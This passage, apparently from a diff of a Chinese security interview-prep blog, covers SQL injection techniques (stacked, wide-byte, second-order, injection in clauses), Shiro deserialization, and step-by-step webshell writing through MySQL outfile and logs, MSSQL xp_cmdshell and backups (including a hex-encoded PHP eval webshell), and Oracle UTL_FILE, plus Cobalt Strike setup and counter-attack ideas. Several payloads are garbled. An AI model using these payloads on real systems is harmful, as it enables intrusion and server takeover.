class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><blockquote>
+<p>特点:<br>堆叠注入在mysql数据库中并不常见，常见于mssql数据库，mssql数据库是默认堆叠注入的堆叠注入必须要用到<code>mysqli_multi_query()</code>函数，可以使用分号分隔来执行多个语句，相当于可直连数据库<br>堆叠注入的危害性非常的大，通常sql注入有诸多限制，比如只能查不能增删改，不能更改数据库设置，而堆叠注入相当于获取了数据库密码进行直连，直接操作数据库</p>
+</blockquote>
+<p>语句</p>
+<p><code>id=1;select user();</code></p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><blockquote>
+<p>特点：<br>字符注入的时候我们需要逃逸单引号，但是php提供了魔术引号开关<code>magic_quotes_gpc</code>和<code>addslashes()</code>，<code>iconv()</code>函数作为防御，特点是自动给传入的参数如单引号，双引号，反斜杠，%00前面加一个反斜杠，进行转义，避免单引号进行逃逸<br>如果数据库是GBK格式而非默认的UTF-8格式，则我们利用两个url编码是一个汉字的特点，组合一个汉字从而解决”\“问题，完成单引号的逃逸</p>
+</blockquote>
+<p>语句</p>
+<p>url编码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">’   <span class="operator">%</span><span class="number">27</span></span><br><span class="line">\   <span class="operator">%</span><span class="number">5</span>c</span><br><span class="line"><span class="operator">%</span>bf \<span class="string">&#x27;=%bf%5c%27=縗&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>闭合过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1\&#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>\<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1縗&#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>縗<span class="string">&#x27;1&#x27;</span> ;</span><br></pre></td></tr></table></figure>
+
+<div class="note warning flat"><p>%bf并不是唯一的一个字符，应该是%81-%FE之间的任意一个都可以,只要是可以跟我们的反斜杠%5c能够组成汉字，完成单引号逃逸的都是可以使用的</p>
+</div>
+
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><blockquote>
+<p>特点：<br>sql语句的变量并不是直接传入的变量，而是通过其它的方式保存到了数据库，形成二次注入</p>
+</blockquote>
+<p>例子：</p>
+<p>比如注册一个用户名为<code> admin’ #</code>的用户，注册时并无SQL注入，修改密码时的SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> #<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>导致越权修改了admin的密码。</p>
+<h3 id="注入拼接位置"><a href="#注入拼接位置" class="headerlink" title="注入拼接位置"></a>注入拼接位置</h3><h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> $id <span class="keyword">and</span> data <span class="operator">&lt;</span> <span class="string">&#x27;$data&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> data <span class="operator">&lt;</span> <span class="string">&#x27;test&#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span>$id;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> $id;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">desc</span><span class="operator">/</span><span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> rand(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit $limit, $size</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span> <span class="keyword">into</span> @,@,@,@;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D://1.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,<span class="keyword">user</span>())),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;r&#x27;</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>)))),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;$log&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;testsetset&#x27;</span><span class="keyword">or</span> sleep(<span class="number">5</span>)) # <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span><span class="operator">+</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)) # <span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-端口查看"><a href="#Linux-端口查看" class="headerlink" title="Linux 端口查看"></a>Linux 端口查看</h2><blockquote>
+<p>netstat命令参数：<br>-t :<br>指明显示TCP端口<br>-u :<br>指明显示UDP端口<br>-l :<br>仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)<br>-p :<br>显示进程标识符和程序名称，每一个套接字&#x2F;端口都属于一个程序。<br>-n :<br>不进行DNS轮询，显示IP(可以加速操作)</p>
+</blockquote>
+<p>netstat -tulpn：显示所有正在运行的进程和它们使用的端口号</p>
+<p>netstat -tul：显示所有TCP和UDP端口号</p>
+<p>netstat -l：显示所有正在监听的端口号</p>
+<p>netstat -n：以数字形式显示端口号</p>
+<hr>
+<p>netstat -ntlp&#x2F;&#x2F;查看当前所有tcp端口·</p>
+<p>netstat -ntulp |grep80&#x2F;&#x2F;查看所有80端口使用情况·</p>
+<p>netstat -an | grep3306&#x2F;&#x2F;查看所有3306端口使用情况·</p>
+<p>查看一台服务器上面哪些服务及端口</p>
+<p>netstat -lanp</p>
+<p>查看一个服务有几个端口。比如要查看mysqld</p>
+<p>ps -ef |grep mysqld</p>
+<p>查看某一端口的连接数量,比如3306端口</p>
+<p>netstat -pnt |grep :3306|wc</p>
+<p>查看某一端口的连接客户端IP 比如3306端口</p>
+<p>netstat -anp |grep3306</p>
+<p>netstat -an 查看网络端口</p>
+<p>lsof -i :port，使用lsof -i :port就能看见所指定端口运行的程序，同时还有当前连接</p>
+<p>nmap 端口扫描</p>
+<p>netstat -nupl (UDP类型的端口)</p>
+<p>netstat -ntpl (TCP类型的端口)</p>
+<p>netstat -anp 显示系统端口使用情况</p>
+<h2 id="Windows隐藏用户查找"><a href="#Windows隐藏用户查找" class="headerlink" title="Windows隐藏用户查找"></a>Windows隐藏用户查找</h2><ul>
+<li>查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\DOMAIN\Account\User</code>项</li>
+<li>计算机-管理-本地用户和组-用户</li>
+<li>控制面板-其他用户设置</li>
+<li><code>net user</code></li>
+<li>D盾</li>
+</ul>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ul>
+<li>起始位置: ^ 结束位置: $</li>
+<li>一般由”&#x2F;&#x2F;[数字]”组成,中括号内为可选项</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php">正则表达式测试实例 ｜ 菜鸟教程 (runoob.com)</a></li>
+</ul>
+<h2 id="给一个IP如何溯源"><a href="#给一个IP如何溯源" class="headerlink" title="给一个IP如何溯源"></a>给一个IP如何溯源</h2><h3 id="审计Web日志-x2F-系统日志-寻找遗留信息"><a href="#审计Web日志-x2F-系统日志-寻找遗留信息" class="headerlink" title="审计Web日志&#x2F;系统日志,寻找遗留信息"></a>审计Web日志&#x2F;系统日志,寻找遗留信息</h3><h3 id="使用whois查询域名注册人等信息-使用IP定位工具定位"><a href="#使用whois查询域名注册人等信息-使用IP定位工具定位" class="headerlink" title="使用whois查询域名注册人等信息,使用IP定位工具定位"></a>使用whois查询域名注册人等信息,使用IP定位工具定位</h3><h3 id="查看IP的dns历史记录-MX记录等"><a href="#查看IP的dns历史记录-MX记录等" class="headerlink" title="查看IP的dns历史记录,MX记录等"></a>查看IP的dns历史记录,MX记录等</h3><h3 id="通过以上操作获取对方个人信息如姓氏-手机号等-手机号查询注册网站-跟进网站-基于jsonp跨域或对应网站信息泄露找到目标更多信息"><a href="#通过以上操作获取对方个人信息如姓氏-手机号等-手机号查询注册网站-跟进网站-基于jsonp跨域或对应网站信息泄露找到目标更多信息" class="headerlink" title="通过以上操作获取对方个人信息如姓氏,手机号等,手机号查询注册网站,跟进网站,基于jsonp跨域或对应网站信息泄露找到目标更多信息"></a>通过以上操作获取对方个人信息如姓氏,手机号等,手机号查询注册网站,跟进网站,基于jsonp跨域或对应网站信息泄露找到目标更多信息</h3><h3 id="部署蜜罐通过攻击者行为获取意图"><a href="#部署蜜罐通过攻击者行为获取意图" class="headerlink" title="部署蜜罐通过攻击者行为获取意图"></a>部署蜜罐通过攻击者行为获取意图</h3><h3 id="伪装必要插件木马监控攻击者"><a href="#伪装必要插件木马监控攻击者" class="headerlink" title="伪装必要插件木马监控攻击者"></a>伪装必要插件木马监控攻击者</h3><h3 id="攻击对方的薄弱资产-进行反制"><a href="#攻击对方的薄弱资产-进行反制" class="headerlink" title="攻击对方的薄弱资产,进行反制"></a>攻击对方的薄弱资产,进行反制</h3><h2 id="shiro漏洞原理"><a href="#shiro漏洞原理" class="headerlink" title="shiro漏洞原理"></a>shiro漏洞原理</h2><blockquote>
+<p>Apache Shiro框架提供了记住密码的功能（RememberMe），</p>
+</blockquote>
+<ul>
+<li>用户登录-反序列化数据-aes加密-base64编码-生成cookie。</li>
+<li>服务端: rememberMe的cookie值-base64解码-AES解密-反序列化-RCE。 </li>
+<li>Payload产生的过程： 命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值 </li>
+<li>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</li>
+</ul>
+<h3 id="550和721的区别"><a href="#550和721的区别" class="headerlink" title="550和721的区别"></a>550和721的区别</h3><p>这两个漏洞主要区别在于<em>Shiro550使用已知密钥碰撞</em>，只要有足够密钥库（条件较低），不需要Remember Cookie<br><em>Shiro721的ase加密的key基本猜不到，系统随机生成</em>，可使用登录后rememberMe去爆破正确的key值，即<em>利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击</em>，难度高</p>
+<h2 id="SQL写webshell的条件和怎么写"><a href="#SQL写webshell的条件和怎么写" class="headerlink" title="SQL写webshell的条件和怎么写"></a>SQL写webshell的条件和怎么写</h2><h3 id="MySQL写入WebShell条件"><a href="#MySQL写入WebShell条件" class="headerlink" title="MySQL写入WebShell条件"></a>MySQL写入WebShell条件</h3><ul>
+<li>数据库的当前用户为ROOT或拥有FILE权限-写文件；</li>
+<li>知道网站目录的绝对路径-存入shell；</li>
+<li>PHP的GPC参数为off状态-避免单引号转义；<br>4.MySQL中的<code>secure_file_priv</code>参数不能为NULL状态。</li>
+</ul>
+<p>注意：关于其中第4点，<code>secure_file_priv</code>参数是MySQL用来限制数据导入和导出操作的效果，如果这个参数被设为了一个目录名，那么MySQL会允许仅在这个目录中可以执行文件的导入和导出，</p>
+<p>例如<code>LOAD DATA</code>、<code>SELECT</code>。。。<code>INTOOUTFILE</code>、<code>LOAD_FILE()</code>等。<br>如果这个参数为NULL，MySQL会禁止导入导出操作，但是这只是意味着通过outfile方法写入WebShell是无法成功的，但是通过导出日志的方法是可以的。</p>
+<h3 id="Mysql写入webshell怎样写"><a href="#Mysql写入webshell怎样写" class="headerlink" title="Mysql写入webshell怎样写"></a>Mysql写入webshell怎样写</h3><p>向MySQL写入WebShell的方式一共有两种，分别是：</p>
+<h4 id="使用outfile方法"><a href="#使用outfile方法" class="headerlink" title="使用outfile方法"></a>使用outfile方法</h4><blockquote>
+<p>Outfile方法其实是MySQL提供的一个用来写入文件的函数，当我们可以控制写入的文件内容以及文件的保存路径时，我们就可以达到传入WebShell的目的。</p>
+</blockquote>
+<p>当我们可以使用union查询时，我们构造一个如下语句，就可以达到效果：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> “这里是WebShell” <span class="keyword">into</span> outfile “Web目录”；</span><br></pre></td></tr></table></figure>
+
+<p>当我们无法使用union时，还有一些其他方法也可以实现（利用分隔符写入）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ lines terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ fields terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE’物理路径’columns terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ lines startingby （这里是WebShell）#</span><br></pre></td></tr></table></figure>
+
+<h4 id="outfile写入webshell操作"><a href="#outfile写入webshell操作" class="headerlink" title="outfile写入webshell操作"></a>outfile写入webshell操作</h4><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>检查<code>secure_file_priv</code>是否开启：<code>show variables like‘%secure%’</code>;确认其不为NULL。有值或为空都可以。（若是为NULL，则需要到<code>my.ini</code>文件中手动修改）<br>检查当前用户是否具备写权限：<code>selectuser,file_priv from mysql.user</code>;确认其用户的值为Y即代表此用户拥有文件写入权限。</p>
+<h5 id="确认注入点"><a href="#确认注入点" class="headerlink" title="确认注入点"></a>确认注入点</h5><p><code>http:/127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1; 参数ID存在SQL注入漏洞 </code>http:&#x2F;127.0.0.1&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1’union select version(),user()#&#96;</p>
+<h5 id="利用outfile写入shell文件"><a href="#利用outfile写入shell文件" class="headerlink" title="利用outfile写入shell文件"></a>利用outfile写入shell文件</h5><p>若<code>secure_file_priv</code>为空，则可以向任意目录写入文件;若<code>secure_file_priv</code>有值，则只能向该值指向的目录写入文件，因为我们的值为空，所以就任意目录写入，但因为还需要工具进行连接，所以最好放在网站的根目录下。</p>
+<p>PAYLOAD（使用Union查询注入）：<br><code>1‘union select1,”” into outfile“F:\PhpStudy20180211\PHPTutorial\WWW\Tp.php‘’# PAYLOAD（不用Union）： </code>1’into outfile“F:\Php、Study2018021\PHPTutorial\WWW\Tp.php” fields terminated by “”#</p>
+<p>文件已被写入到网站的根目录下，接下来就可以使用连接工具（蚁剑、菜刀、冰蝎等）进行连接了</p>
+<h4 id="基于log日志写入法"><a href="#基于log日志写入法" class="headerlink" title="基于log日志写入法"></a>基于log日志写入法</h4><blockquote>
+<p>基于log日志写入的方法其实是先将日志文件的导出目录修改成Web目录，然后执行了一次简单的WebShell代码查询功能，此时日志文件记录了此过程，这样再Web目录下的日志文件就变成了WebShell。</p>
+</blockquote>
+<p>例如，我们先设置日志文件的导出目录：<code>set global general_file=‘Web目录’</code>；然后执行一遍：<code>select “WebShell代码”</code>；即可。</p>
+<h4 id="导入日志写webshell操作"><a href="#导入日志写webshell操作" class="headerlink" title="导入日志写webshell操作"></a>导入日志写webshell操作</h4><h5 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h5><p>检查当前MySQL下log日志是否开启，以及log的默认地址在哪里：<br><code>show variables like ‘%general%’; 将log日志开启，并设置日志的写入位置: </code>Set globalgeneral_log &#x3D; on;<br>&#96;Set globalgeneral_log_file &#x3D;‘F:&#x2F;test.php’;</p>
+<h5 id="使用写入日志再读取的方法写webshell"><a href="#使用写入日志再读取的方法写webshell" class="headerlink" title="使用写入日志再读取的方法写webshell"></a>使用写入日志再读取的方法写webshell</h5><p>直接在SQL注入点，使用查询语句，添加WebShell代码，WebShell代码被记录到日志文件中，接下就可以使用连接工具进行连接了。</p>
+<h3 id="Mssql写入webshell条件"><a href="#Mssql写入webshell条件" class="headerlink" title="Mssql写入webshell条件"></a>Mssql写入webshell条件</h3><ol>
+<li>有相应的权限db_owner</li>
+<li>获得Web目录的绝对路径</li>
+</ol>
+<h3 id="Mssql写入webshell怎样写"><a href="#Mssql写入webshell怎样写" class="headerlink" title="Mssql写入webshell怎样写"></a>Mssql写入webshell怎样写</h3><ul>
+<li>利用xp_cmdshell命令</li>
+<li>差异备份写入shell</li>
+<li>log备份写入shell</li>
+</ul>
+<h4 id="使用XP-cmdshel怎样l写入Webshell？"><a href="#使用XP-cmdshel怎样l写入Webshell？" class="headerlink" title="使用XP_cmdshel怎样l写入Webshell？"></a>使用XP_cmdshel怎样l写入Webshell？</h4><h5 id="准备：-1"><a href="#准备：-1" class="headerlink" title="准备："></a>准备：</h5><ul>
+<li>查找网站目录的绝对路径:<ul>
+<li>通过报错信息查找；</li>
+<li>通过目录爆破猜解；</li>
+<li>通过旁站的目录确定；</li>
+<li>通过读取配置文件查找。</li>
+<li>通过存储过程来搜索；<ul>
+<li>xp_cmdshell</li>
+<li>xp_dirtree</li>
+</ul>
+</li>
+<li>execute master…xp_dirtree ‘c:’;可以查出所有c:\下的文件、目录、子目录</li>
+</ul>
+</li>
+</ul>
+<h5 id="查找网站目录的绝对路径"><a href="#查找网站目录的绝对路径" class="headerlink" title="查找网站目录的绝对路径"></a>查找网站目录的绝对路径</h5><p>在真实环境中时，我们执行execute可能并不能得到回显信息，但我们可以在注入点处新建一张表，然后将<code>xp_dirtree</code>查询到的信息插入其中，再查询这张表即可得相应的绝对路径了。<br><code>Xp_cmdshell</code>是一个更为有效的查询绝对路径的函数，但是目前已经被SQLServer默认关闭了，但我们可以使用如下命令启用这个选项。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’,1;//允许修改高级参数RECONFIGURE;</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’,1;//打开xp_cmdshell扩展RECONFIGURE;–打开xp_cmdshell扩展</span><br></pre></td></tr></table></figure>
+
+<h5 id="执行CMD命令查询"><a href="#执行CMD命令查询" class="headerlink" title="执行CMD命令查询"></a>执行CMD命令查询</h5><p>开启了<code>xp_cmdshell</code>之后我们就可以执行CMD命令了，例如:<br><code>for /r c:%i in (1*.php) do @echo %i</code><br>就可以查询c:\目录下的所有符合<code>1*.php</code>的文件<br>同理，在实际应用中，我们也是新建一个表，并将<code>xp_cmdshell</code>查询到的信息插入后，再次查询即可。</p>
+<h5 id="使用xp-cmdshell写入WebShell"><a href="#使用xp-cmdshell写入WebShell" class="headerlink" title="使用xp_cmdshell写入WebShell"></a>使用xp_cmdshell写入WebShell</h5><p>我们可以通过<code>xp_cmdshell</code>执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下，所以我们必须提前知道Web目录的绝对路径。<br>PAYLOAD：<br>&#96;1’;execmaster…xp_cmdshell’echo^&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;&#96;&#96;</p>
+<h4 id="使用差异备份怎样写入WebShell"><a href="#使用差异备份怎样写入WebShell" class="headerlink" title="使用差异备份怎样写入WebShell"></a>使用差异备份怎样写入WebShell</h4><h5 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h5><p>首先对某一数据库进行备份。<br>PAYLOAD：<br><code>id=1’;backup database 库名 to disk=‘F:\PhpStudy20180211\PHPTutorial\WWW\back.bak’;</code></p>
+<h5 id="将WebShell代码写入数据库中"><a href="#将WebShell代码写入数据库中" class="headerlink" title="将WebShell代码写入数据库中"></a>将WebShell代码写入数据库中</h5><p>PAYLOAD：<br><code>id=1’; create table cybk([cmd][image]);#创建一个新表</code><br>PAYLOAD：<br><code>id=1’;insertintocybk(cmd)vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);#将WebShell的代码转换成ASCII码</code></p>
+<p>最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码</p>
+<p>PAYLOAD：<br>&#96;id&#x3D;1’; backup database library todisk&#x3D;‘F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</p>
+<h4 id="使用log备份写入WebShell"><a href="#使用log备份写入WebShell" class="headerlink" title="使用log备份写入WebShell"></a>使用log备份写入WebShell</h4><p>要求</p>
+<p>数据库已经备份过，且选择完整模式的恢复模式.<br>相比较差异备份而言，使用Log备份文件会小的多</p>
+<p>首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。</p>
+<h3 id="ORACLE写入WebShell条件"><a href="#ORACLE写入WebShell条件" class="headerlink" title="ORACLE写入WebShell条件"></a>ORACLE写入WebShell条件</h3><p>1.有DBA权限<br>2.获得Web目录的绝对路径</p>
+<h3 id="Oracle写webshell怎样写"><a href="#Oracle写webshell怎样写" class="headerlink" title="Oracle写webshell怎样写"></a>Oracle写webshell怎样写</h3><h4 id="使用文件访问包方法写入Webshell"><a href="#使用文件访问包方法写入Webshell" class="headerlink" title="使用文件访问包方法写入Webshell"></a>使用文件访问包方法写入Webshell</h4><p>创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向<code>/home/oracle</code>这一路径下：<br><code>create or replace directory IST0_DIR as ‘/home/oracle’;</code>创建ORACLE目录对象<br>创建好后，我们需要对其进行一下授权过程，让其能够顺利的写入WebShell代码。<br><code>grant read, write on directory IST0_DIR tosystem;`` 然后写入文件，定义变量类型为</code>utl_file.file_type&#96;，然后将WebShell的代码写入此文件中。<br>直接访问该文件，即可查看到其中的WebShell代码，如果这个文件是放置在Web目录下的，那么就可以被攻击者成功利用。</p>
+<h2 id="CS如何上线Windows"><a href="#CS如何上线Windows" class="headerlink" title="CS如何上线Windows"></a>CS如何上线Windows</h2><ul>
+<li>配置teamserver [ip] [密码]</li>
+<li>打开CS，连接teamserver服务器</li>
+<li>添加监听器</li>
+<li>生成后门</li>
+</ul>
+<h2 id="正向代理-x2F-反向代理（列举工具）"><a href="#正向代理-x2F-反向代理（列举工具）" class="headerlink" title="正向代理&#x2F;反向代理（列举工具）"></a>正向代理&#x2F;反向代理（列举工具）</h2><h3 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h3><p>一种部署于客户端与服务器之间的服务器，代替客户端与服务器对外部网络进行发送或接收消息。</p>
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>在客户端部署代理服务器，<em>代替客户端对外部网络发送和接收消息</em>。客户端发送一个指定目标的请求给代理服务器，代理服务器再发送给目标服务器，目标服务器收到请求后，将响应的内容发送给代理服务器，代理服务器发给客户端。</p>
+<p>在正向代理的过程中，代理服务器代替客户端向目标服务器发送请求，</p>
+<div class="note info flat"><p><strong>目标服务器不知道谁是真正的客户端，不知道访问自己的是一个代理服务器还是客户端。服务器只负责将响应包发送给请求方。</strong></p>
+</div>
+
+
+<h3 id="正向代理的用途"><a href="#正向代理的用途" class="headerlink" title="正向代理的用途"></a>正向代理的用途</h3><h4 id="1、突破访问控制"><a href="#1、突破访问控制" class="headerlink" title="1、突破访问控制"></a>1、突破访问控制</h4><p>例如：VPN<br>国内用户不能直接访问国外的网站，需要通过代访问理服务器，代理服务器将我们的请求发送国外的目标服务器，目标服务器将请求的响应发送给代理服务器，代理服务器再发给用户。这样就实现了正向代理。</p>
+<h4 id="2、提高访问速度"><a href="#2、提高访问速度" class="headerlink" title="2、提高访问速度"></a>2、提高访问速度</h4><p>代理服务器里有一个硬盘缓冲区，会将请求响应保存到缓冲区中。下次访问时会直接读取缓冲区中的数据返还给用户。</p>
+<h4 id="3、隐藏客户端真实的IP"><a href="#3、隐藏客户端真实的IP" class="headerlink" title="3、隐藏客户端真实的IP"></a>3、隐藏客户端真实的IP</h4><p>因为访问目标服务器的是代理服务器，而不是用户，这样便能隐藏客户端的真实IP 。<br>例：暗网<br>在暗网里，我们访问一个目标时要通过几个代理服务器进行转发，目的就是为了防止被其他人查到自己真实的IP。</p>
